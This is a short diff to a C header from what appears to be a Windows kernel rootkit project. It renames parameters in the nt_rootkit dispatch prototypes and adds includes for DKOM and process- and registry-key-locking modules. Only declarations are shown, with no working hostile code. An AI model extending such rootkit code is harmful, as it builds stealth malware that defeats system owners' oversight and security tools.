@@ -8,6 +8,9 @@
 #define _IOCTL_H_
 
 #include <ntddk.h>
+#include "dkom.h"
+#include "lock_proc.h"
+#include "lock_key.h"
 
 #define DRIVER_PREFIX       (0x1337)
 
@@ -18,10 +21,8 @@
 
 DRIVER_DISPATCH nt_rootkit_ioctl;
 
-NTSTATUS nt_rootkit_create_close(PDEVICE_OBJECT driver_obj, PIRP irp);
+NTSTATUS nt_rootkit_create_close(PDEVICE_OBJECT dev_obj, PIRP irp);
 
-NTSTATUS nt_rootkit_complete(PDEVICE_OBJECT driver_obj, PIRP irp);
-
-NTSTATUS nt_rootkit_ioctl(PDEVICE_OBJECT driver_obj, PIRP irp);
+NTSTATUS nt_rootkit_ioctl(PDEVICE_OBJECT dev_obj, PIRP irp);
 
 #endif
